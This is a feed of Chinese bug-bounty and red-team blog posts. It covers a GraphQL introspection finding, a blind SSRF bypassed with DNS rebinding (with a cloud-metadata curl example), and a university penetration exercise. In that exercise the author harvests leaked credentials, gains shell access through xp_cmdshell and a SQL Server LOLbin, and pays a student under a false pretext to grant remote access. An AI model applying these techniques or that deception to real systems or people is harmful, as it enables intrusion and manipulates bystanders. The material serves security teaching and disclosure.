        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>经历了去年一年疫情大背景下的互联网寒冬，年初时节，终于等到了春回大地，疫情时代的基本结束。但是很遗憾，经历了去年的亏损后，笔者的小微企业已经熬不过今年年中了，作为一个20来岁的创业者准备申请股权转让了，颇有些感慨。自己忙里忙外，终究还是要老老实实地放下那些不切实际的想法，接受现实和市场的残酷。</p><p>做公司和业务的这两年，笔者经历了很多，除去少部分成单的绽放时刻，大部分时候多的还是被人心和人性打的鼻青脸肿的感悟。时时刻刻考虑企业能否活过下一个季度，这让一个20来岁的年轻人身心俱疲，感到迷惘、不安和浮躁，迷失了很多的初心与热爱。所以我选择给足自己沉淀的时间，寻觅本心，而不是在年轻到不能再年轻的岁月里急于求成。</p><p>如今回首看来，可能同时做技术和商业的人，心中最纯粹的东西可能也只剩下技术了。笔者小时候被黑客的故事吸引，从小到大，一不小心坚持学习安全已经好些年了，受智商和天赋所限，自己学了挺久依然是菜鸡水平。在学安全的这些年被朋友们问到最多的一个问题就是——“我学了owasp top10漏洞基础后，如何有效地挖掘漏洞”，每次被问到这种问题，我词穷的回答都是“补足基础，补足基础，补足基础”。</p><p><strong>在笔者仅有的一点知识储备里中，笔者一直坚信，在无论在攻还是防，只要拿捏好开发的特性，运维的习性，人类的本性——就能无往不利</strong></p><p>因此笔者将这一两年的文章收录起来做成合订本，共12小节，12890字，希望多少能给大家看到一些有趣的安全问题。合订本文章中的图都是P的，不涉及任何“实际漏洞”含义。<strong>笔者想说，在这个知识付费，技术人员缺钱谋生存，小微企业的发展举步维艰时代里，坚持做免费的分享实属不易。衣食足而知荣辱，仓廪实而知礼节，很遗憾，笔者是个为彩礼发愁，房子也买不起的穷鬼，短时期内也无法继续更新了，要省出时间和生活对线了，希望各位理解。</strong></p><p><strong>如果北京有坑位愿意收留笔者，也欢迎私信笔者交流，感激不尽。希望在将来的某一天，我们在下一场山海相遇。</strong></p><p><strong>笔者vx:J0o1ey997，也欢迎喜欢技术的兄弟们一块交流</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314016.png" alt="图片" style="zoom: 33%;" /><p><strong>部分截图</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314066.png" alt="图片" style="zoom:50%;" /><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314114.png" alt="图片" style="zoom:50%;" /><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314136.png" alt="图片" style="zoom:50%;" /><p><strong>下载链接</strong></p><p><a href="https://github.com/J0o1ey/BountyHunterInChina/raw/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC.pdf">https://github.com/J0o1ey/BountyHunterInChina/raw/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活偶悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(十二)-记一次最终被忽略的graphql漏洞挖掘经历</title>
      <link href="/2023/04/02/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%8D%81%E4%BA%8C-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%80%E7%BB%88%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84graphql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E5%8E%86/"/>
      <url>/2023/04/02/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%8D%81%E4%BA%8C-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%80%E7%BB%88%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84graphql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>前几日在hackerone上挖掘某高赏金厂商，走了一遍业务点后，偶然发现http history里面有个graphql的接口</p><p>于是一场坐牢之旅开始了</p><h2 id="0x01-前置知识与内省查询"><a href="#0x01-前置知识与内省查询" class="headerlink" title="0x01 前置知识与内省查询"></a>0x01 前置知识与内省查询</h2><p>不了解graphql的兄弟可以看看如下的图</p><p>通俗易懂地说：Graphql类似于restful的API 开源查询语言，其巧妙的新方法来改善应用程序中客户端和服务器之间的交互，为项目构建和后期维护提供了新思路</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231615.png" alt="image-20230316102800443"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231469.png" alt="image-20230316102729116"></p><p>在实践经验中，发现国内用graphql技术的厂商并不是很多，大部分还是基于restful的，国外比较流行</p><p>在graphql中，是支持<strong>“内省查询”</strong>这种比较特殊的技术的</p><p>简单来说就是，GraphQL内置了<strong>类似于“swagger的”接口文档，你可以通过内省的方法获得这些信息，如graphql中对象定义、接口参数等信息。</strong></p><p>当使用者不知道某个GraphQL接口中的类型哪些是可用的，可以通过__schema字段来向GraphQL查询哪些类型是可用的。</p><p>例如，您可以通过__schema通过此自省功能了解有关接口类型的更多信息。(下方图源于酒仙桥部队的一篇文章)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231604.png" alt="img"></p><p>而内省查询通常是不应该对外能直接使用的</p><h2 id="0x02-挖掘过程"><a href="#0x02-挖掘过程" class="headerlink" title="0x02 挖掘过程"></a>0x02 挖掘过程</h2><p>有了一定的前置知识，我们来看这个graphql的点</p><p>笔者在抓到该厂商某个graphql的接口后,尝试使用_schema内省查询来获取接口的额外信息</p><pre><code class="http">POST /web-stories-api/graphql HTTP/1.1Host: xxxxxxxxxxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/jsonContent-Length: 1531    &#123;&quot;query&quot;:&quot;query Query &#123;\n    __schema &#123;\n      queryType &#123; name &#125;\n      mutationType &#123; name &#125;\n      subscriptionType &#123; name &#125;\n      types &#123;\n        ...FullType\n      &#125;\n      directives &#123;\n        name\n        description\n        locations\n        args &#123;\n          ...InputValue\n        &#125;\n      &#125;\n    &#125;\n  &#125;\n\n  fragment FullType on __Type &#123;\n    kind\n    name\n    description\n    fields(includeDeprecated: true) &#123;\n      name\n      description\n      args &#123;\n        ...InputValue\n      &#125;\n      type &#123;\n        ...TypeRef\n      &#125;\n      isDeprecated\n      deprecationReason\n    &#125;\n    inputFields &#123;\n      ...InputValue\n    &#125;\n    interfaces &#123;\n      ...TypeRef\n    &#125;\n    enumValues(includeDeprecated: true) &#123;\n      name\n      description\n      isDeprecated\n      deprecationReason\n    &#125;\n    possibleTypes &#123;\n      ...TypeRef\n    &#125;\n  &#125;\n\n  fragment InputValue on __InputValue &#123;\n    name\n    description\n    type &#123; ...TypeRef &#125;\n    defaultValue\n  &#125;\n\n  fragment TypeRef on __Type &#123;\n    kind\n    name\n    ofType &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n                ofType &#123;\n                  kind\n                  name\n                &#125;\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &#125;&quot;&#125;</code></pre><p>结果非常nice，内省查询后目标返回了接口的详细信息</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231358.png" alt="image-20230401094521366"></p><p>但是以上的数据看起来比较杂乱无章，决定使用内省查询的图形化的解析功能</p><p><a href="https://apis.guru/graphql-voyager/">https://apis.guru/graphql-voyager/</a>  这个site为内省查询的JSON response提供了不错的图形化解析</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231450.png" alt="image-20230401094819603"></p><p>解析后结果如图(有些字段涉及厂商名称，打码了)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231904.png" alt="image-20230401095109158"></p><p>该graphql接口是<strong>基于某个获取“社交分享”的业务点的</strong>，最终我在图形化的解析结果中发现：<strong>某个查询对象中有一个并没有用到实际业务中的敏感参数“address”</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231802.png" alt="image-20230401095411362"></p><p>看到这里，颅内高潮便起来了</p><p>直接把address参数加入query查询里，最终成功回显出来了众多“社交分享”中的address</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231393.png" alt="image-20230401100029460"></p><p>但是很遗憾，<strong>大部分address都是null，或者最高精确度到“镇级行政区”的数据，没有详细到能出发表社交信息人的具体位置</strong></p><p>但是还是决定试一试，向xx厂商安全团队报告了这个问题</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192231086.png" alt="image-20230401100539493"></p><p>厂商先后回复的意思大概是说，<strong>address等字段虽然在明面的业务请求上没展示，但是并不属于特别敏感的信息，对用户数据安全不会产生影响</strong></p><p><strong>尽管关闭这个graphql接口的内省查询会更安全，但是我们认为保留graphql内省查询这个feature会让菜鸡的安全研究人员(比如你)更容易找到api中的漏洞问题</strong></p><p><strong>所以我们暂时不会修改这个功能点，虽然我们很赞赏你花时间来提交我们赏金项目的问题</strong></p><h2 id="0x03-后言"><a href="#0x03-后言" class="headerlink" title="0x03 后言"></a>0x03 后言</h2><p>看到这里，虽然有些失落，但是也无所谓，<strong>在每次漏洞挖掘与经验的学习的过程中中，有所习得（无论是知识还是经验）才是关键所在</strong>，而漏洞的最终效果和产出往往是天注定，我们强求不来</p><p><strong>谁又知道下个”内省查询”不会产出boom级别的信息和漏洞呢</strong></p><p><strong>Hack to learn and learn to hack缺一不可</strong></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(十一)-从忽略到triage再到失望bounty的SSRF挖掘之旅</title>
      <link href="/2023/03/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%8D%81%E4%B8%80-%E4%BB%8E%E5%BF%BD%E7%95%A5%E5%88%B0triage%E5%86%8D%E5%88%B0%E5%A4%B1%E6%9C%9Bbounty%E7%9A%84SSRF%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/"/>
      <url>/2023/03/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%8D%81%E4%B8%80-%E4%BB%8E%E5%BF%BD%E7%95%A5%E5%88%B0triage%E5%86%8D%E5%88%B0%E5%A4%B1%E6%9C%9Bbounty%E7%9A%84SSRF%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h2><p>前两天和朋友聊天，他发现了一家在hackerone上赏金颇高的Program，并且发现了其中的漏洞</p><p>让老夫羡慕不已</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228334.png" alt="image-20230316093850240"></p><p>去hackerone看了看厂商信息，漏洞奖励确实是非常诱人的</p><p>而且BugBounty Program Launched on Apr 2015….</p><p>8年hackerone的老厂商了，业务点本来就不多，又被世界各国牛逼的黑客们挖了八年，难度可想而知</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228330.png" alt="image-20230316094052559"></p><p>但是为了赏金迎难而上，才应该是真正的漏洞猎人该有的风格。</p><h2 id="0x03-走业务点万念俱灰到发现敏感请求"><a href="#0x03-走业务点万念俱灰到发现敏感请求" class="headerlink" title="0x03 走业务点万念俱灰到发现敏感请求"></a>0x03 走业务点万念俱灰到发现敏感请求</h2><p>从Hackerone的Program scope中搜集了一下业务信息，虽然展开测试</p><p>测试了常规的一些WEB漏洞，IDOR等漏洞，发现完全没有一点机会，Filter和鉴权写的非常过硬，而且用户都是通过uuid类型来传参进行身份鉴权</p><p>首先目标没有IDOR，其次哪怕有IDOR也非常难以利用</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228180.png" alt="image-20230316094832965"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228896.png" alt="image-20230316095041490"></p><p>从晚上九点测到了第二天凌晨两点，啥也没测出来，万念俱灰准备洗洗睡了</p><p>但是心想还是看看Burp的HttpHistory吧，万一有自己没注意的敏感请求呢</p><p>结果没想到。。。还真就看到了一个graphql的敏感查询请求</p><pre><code class="http">POST /agw/graphql?op=UrlReachableVerifierQuery&amp;client_trace_id=09bee58d-8358-4f00-acc0-8d26d0018d32,rst:1678201703792 HTTP/1.1Host: xxxxxCookie: xxxxUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonAuthorization: xxxxxContent-Length: 386Origin: https://xxxxxSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-siteTe: trailersConnection: close&#123;&quot;operationName&quot;:&quot;UrlReachableVerifierQuery&quot;,&quot;variables&quot;:&#123;&quot;url&quot;:&quot;http://xxxx.com/&quot;&#125;,&quot;query&quot;:&quot;query UrlReachableVerifierQuery($url: String!) &#123;\n  verifyUrlReachable(url: $url) &#123;\n    ... on UrlReachableResult &#123;\n      url\n       __typename\n    &#125;\n    ... on GenericError &#123;\n      errorCode\n      message\n      __typename\n    &#125;\n    __typename\n  &#125;\n&#125;\n&quot;&#125;</code></pre><p>url在json中传参，测啥漏洞，我想大家应该都懂</p><p>立马用Burp的Collaborator测试dnslog</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228905.png" alt="image-20230316095750418"></p><p>果不其然，收到了来自两个IP的Http Request，但是目标的回显少的可怜</p><p>只有url，__typename两个键的JSON返回了回来</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228999.png" alt="image-20230316100032084"></p><p>查了一下，两台发送请求的服务器都部署在GoogleCloud，瞬间就让人兴奋了起来</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228570.png" alt="image-20230316100318112"></p><p>但是想了一下又萎了，GoogleCloud meta data(元数据)的获取不像国内的某某云，其必须带有特定的Header</p><p>这个SSRF点既没有回显也没法通过构造恶意页面的js发送带有header的数据，真是操蛋</p><pre><code class="shell">request example:curl &quot;http://metadata.google.internal/computeMetadata/v1/instance/image&quot; -H &quot;Metadata-Flavor: Google&quot;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228658.png" alt="image-20230316100749756"></p><p>思前想后，寻思也算个盲SSRF，先交了再说</p><h2 id="0x04-秒忽略NoBugBounty到利用Graphql发掘新的攻击面"><a href="#0x04-秒忽略NoBugBounty到利用Graphql发掘新的攻击面" class="headerlink" title="0x04 秒忽略NoBugBounty到利用Graphql发掘新的攻击面"></a>0x04 秒忽略NoBugBounty到利用Graphql发掘新的攻击面</h2><p>交完这个盲SSRF点，睡了一觉起来，发现直接被厂商的安全团队给忽略了</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228020.png" alt="image-20230316101227267"></p><p>真是操蛋，盲SSRF看样不太行，混不到钱，我们必须得发掘新的攻击面</p><p>（不了解Graphql的兄弟可以看下下面这张图，生动地解释了Restful类型接口和Graphql接口的区别，上方为restful接口请求样式，下方为graphql的接口请求样式）</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228916.png" alt="image-20230316102800443"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228031.png" alt="image-20230316102729116"></p><p>既然这个点是基于Graphql进行查询的</p><p>那么我们可以自定义查询的column(param)，如果存在该column，那么就会返回这个参数的有效结果，二话不说开始FUZZ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228743.png" alt="image-20230316102014491"></p><p>最终结果让人非常寒心，啥勾八东西也没有(这里当时的图忘存了)</p><p>再次陷入万念俱灰，但是仔细观察graphql查询请求的op参数，让我有了一点想法</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228110.png" alt="image-20230316102242146"></p><p>op字段为UrlReachableVerifierQuery，我们为啥不试试拿他当query的column呢？</p><p>结果发现测试到UrlReachable这个字段时，reponse中出现了有效回显”Reachable”</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228693.png" alt="image-20230316103133250"></p><p>nice，现在我们可以用这个接口来探测内网端口开放情况了</p><p>我直接使用GoogleCloud的meta data地址来探测端口连通性</p><p>没想到直接告诉我了个”Not_Reachable”。。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228129.png" alt="image-20230316103324813"></p><p>那么就得用点方法绕过了</p><h2 id="0x05-绕过SSRF限制探测内网"><a href="#0x05-绕过SSRF限制探测内网" class="headerlink" title="0x05 绕过SSRF限制探测内网"></a>0x05 绕过SSRF限制探测内网</h2><p>试了试302跳转，短连接等方式，都不好使</p><p>于是寄出dns rebinding</p><p>在ceye上配置好dns rebinding的IP地址<strong>（googleCloud meta data的ip地址为169.254.169.254，借此来验证内网连通性）</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228629.png" alt="image-20230316103545120"></p><p>直接dns rebinding来绕过SSRF限制</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228089.png" alt="image-20230316103640166"></p><p>发现我们成功获得了“Reachable”的结果！</p><p>接下来就是常规操作了，探测端口连通性</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228106.png" alt="image-20230316103901683"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228270.png" alt="image-20230316104112068"></p><p>80端口reachable，其他端口Not_Reachable，已经证明了此处SSRF可探测内网</p><h2 id="0x06-再次提交漏洞到triage与bounty"><a href="#0x06-再次提交漏洞到triage与bounty" class="headerlink" title="0x06 再次提交漏洞到triage与bounty"></a>0x06 再次提交漏洞到triage与bounty</h2><p>再次提交后漏洞得到了Triage</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228745.png" alt="image-20230316104214787"></p><p>triage的severity为medium</p><p>最终bounty按照low发的</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192228255.png" alt="image-20230331183101311"></p><p>仍在交涉中，估计是大写的寄</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(十)-记一次层层突破的攻防演练</title>
      <link href="/2023/02/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%8D%81-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B1%82%E5%B1%82%E7%AA%81%E7%A0%B4%E7%9A%84%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
      <url>/2023/02/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E5%8D%81-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B1%82%E5%B1%82%E7%AA%81%E7%A0%B4%E7%9A%84%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文简单记述了一下本人在某攻防演练过程中一次层层突破的有趣经历</p><p>技术性在攻防实战中虽然一般，但是层层突破的过程比较有意思，并用到了比较多的思路，因此分享给大家</p><h2 id="0x01-SSO账号获取"><a href="#0x01-SSO账号获取" class="headerlink" title="0x01 SSO账号获取"></a>0x01 SSO账号获取</h2><p>由于目标是某大学，对外开放的服务基本上都是一些静态Web页面，没什么太多利用点</p><p>因此获取一个该大学的SSO账号就显得尤为重要~</p><p>本人使用该大学的域名、以及常见的搜索密码关键词，调用Github的api在Github中定位到了就读该大学的关键用户</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225239.jpg" alt="image-20220618100944824"></p><p>该同学安全意识较为薄弱，经常将账号密码硬编码在程序内，这正是我们苦苦寻觅的人才</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225602.jpg" alt="image-20220618100922784"></p><p>结合他在其他项目中硬编码的学号，我们成功利用他的学号+密码登陆该大学SSO系统和学生vpn系统</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225007.jpg" alt="image-20220618101339023"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225367.jpg" alt="image-20220618103125720"></p><p>本来以为可以进驻内网了，结果发现学生VPN除了访问一些学术资源，啥也干不了</p><p>好在进去SSO了，那么后面接近靶标之路就会更加轻松，现在自然要把着力点放在SSO能访问到的系统漏洞挖掘上</p><h2 id="0x02-某系统接口利用测试tips获取大量信息"><a href="#0x02-某系统接口利用测试tips获取大量信息" class="headerlink" title="0x02 某系统接口利用测试tips获取大量信息"></a>0x02 某系统接口利用测试tips获取大量信息</h2><p>走了一遍SSO能访问的系统</p><p>发现某项目申请处，可以搜索学校其他同学的信息</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225911.jpg" alt="image-20220618101937376"></p><p>如图，接口在流量中是这样表现的</p><p>我们利用一个测试tips，将其中的关键键置空，或者使用通配符*，发现可以成功返回全校三万多名学生的信息</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225483.jpg" alt="image-20220618102208679"></p><p>凭此成果，仅能得一点可怜的分数，还得继续来撸</p><p>我继续在系统重翻找接口，终于发现了一个可以搜索学校老师的接口</p><p>同样的使用刚刚的tips，在关键的键处置空键值或使用*，这次运气很好，返回的信息中，甚至出现了所有老师的工号和md5加密的密码</p><p>甚至包括sso管理员的密码。。。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225031.jpg" alt="image-20220618102809575"></p><p>解了一下admin的密码，非常遗憾，解不开，不然游戏就直接结束了~</p><p>但我们现在掌握了大量老师的工号，密码(包括负责运维的老师)，那么我们后面进驻内网的工作就会顺利很多</p><h2 id="0x03-进驻DMZ区并获取内网跳板"><a href="#0x03-进驻DMZ区并获取内网跳板" class="headerlink" title="0x03 进驻DMZ区并获取内网跳板"></a>0x03 进驻DMZ区并获取内网跳板</h2><p>我们做了很长时间的信息搜集，找到了该学校开放在外网给运维人员使用的DMZ区VPN</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225449.jpg" alt="image-20220618103620549"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225800.jpg" alt="image-20220618105819143"></p><p>我们直接用刚刚获取到负责运维的老师的账号密码登录，发现一直不好使…</p><p>结果试了一下，发现密码竟然和工号是一致的….真是无语…</p><p>随后就成功接入了该学校DMZ区VPN</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225274.jpg" alt="image-20220618103938618"></p><p>进入DMZ区后，我们简单做了一下弱口令扫描探测，发现了一台SqlServer的弱口令</p><p>直接通过恢复执行xp_cmdshell，发现还是管理员权限</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225706.jpg" alt="image-20220618104248653"></p><p>但是列进程的时候发现了万恶的某60</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225084.jpg" alt="image-20220618104339199"></p><p>试了试自己之前的certutil下载文件绕过方法，因为之前交了360SRC，已经被修复了，TMD直接被拦</p><p>但是仔细一想，SqlServer中是存在LOL bin的，可以实现白利用执行powershell</p><pre><code class="powershell">LOL binC:\Program files (x86)\Microsoft SQL Server\xxx\Tools\Binn\SQLPS.exeC:\Program files (x86)\Microsoft SQL Server\xxx\Tools\Binn\SQLPS.exe whoami</code></pre><p>通过此姿势，成功上线CS</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225462.jpg" alt="image-20220618104803788"></p><p>如此一来，访问内网核心区的跳板就有了~</p><h2 id="0x04-被踢出内网与收买学校内鬼"><a href="#0x04-被踢出内网与收买学校内鬼" class="headerlink" title="0x04 被踢出内网与收买学校内鬼"></a>0x04 被踢出内网与收买学校内鬼</h2><p>还没等开心一会，突然发现CS的进程已经被下掉了，并且DMZ区账号也被踢下线并改密码了</p><p>估计是目标机有主机安全设备，检测到了进程中的CS内存特征或流量特征。。。</p><p>线索全断，让人陷入了沉思，不过转念一想，内网代理套代理也是卡的要死，还不如想想办法如何直接获取内网核心区的访问权限</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225018.gif" alt="摸脑袋表情包"></p><p>我们于是在咸鱼上开始寻找猎物，发现了就读于该大学的某学生</p><p>该学生咸鱼上挂的具体内容忘记截图了，大体意思是”<strong>我是xxx大学的学生，可以为大家提供xxx大学的有关帮助，考研，生活等等等，视难度收费10-50</strong>“</p><p>我们直接加他联系方式，给他转了50。</p><p>话术如下</p><pre><code class="text">我：你好你好，我是xx大学的学生，现在在外面，回不去学校，想用下你的电脑，访问学校内的教务系统，给您50元答谢对方：哦哦可以，你看看怎么整我：你下个向日葵，然后把主机号和密码发给我就好对方：okok</code></pre><p>就这样，我们连上了这个二傻子的向日葵</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225633.jpg" alt="image-20220618111131625"></p><p>然后直接用他的cmd，把权限给到CS，做好权限维持</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225987.jpg" alt="image-20220618110447005"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225324.jpg" alt="image-20220618110346861"></p><p>把隧道传出来，发现学生的PC竟然可以直接访问核心区。。。随后在内网又开始了扫描，撸了一些乱七八糟的系统，比如海康某设备的RCE，web系统的注入，网关等等东西，但都没法反弹shell。。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225427.jpg" alt="image-20220618111536680"></p><p>当时又发现了一个SSH弱口令，可给我们高兴坏了，二话不说连过去</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225715.jpg" alt="image-20220618111452695"></p><p>当看到这一幕的时候，一身冷汗，因为非常清楚，自己踩到内网蜜罐了，又要寄了。。。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225087.jpg" alt="image-20220618105955678"></p><p>果然不出20分钟，那位同学就发来了微信</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225460.jpg" alt="image-20220618110022087"></p><p>气煞我也，后面想继续用金钱收买，道了歉，说自己一不小心传错软件了，又给他转了20块钱，想再用一阵</p><p>可谁知</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225867.jpg" alt="image-20220618112218432"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225166.jpg" alt="image-20220618112348348"></p><p>气煞我也，竟然不讲武德</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225560.jpg" alt="img"></p><h2 id="0x05-近源渗透直捣黄龙"><a href="#0x05-近源渗透直捣黄龙" class="headerlink" title="0x05 近源渗透直捣黄龙"></a>0x05 近源渗透直捣黄龙</h2><p>眼看着所有能通向内网核心区的路径全寄了，我们只能想办法出奇制胜，摇人去近源渗透</p><p>叫甲方派了了个人，混进学校内的图书馆，用之前获取到的学生sso账号接入校园网</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225817.jpg" alt="image-20220618112848638"></p><p>如此一来，我们就有了稳定且不易察觉的内网通道😂</p><p>接下来就是常规操作了，漏扫核心网段，发现了docker api未授权和vcenter的RCE</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192225232.jpg" 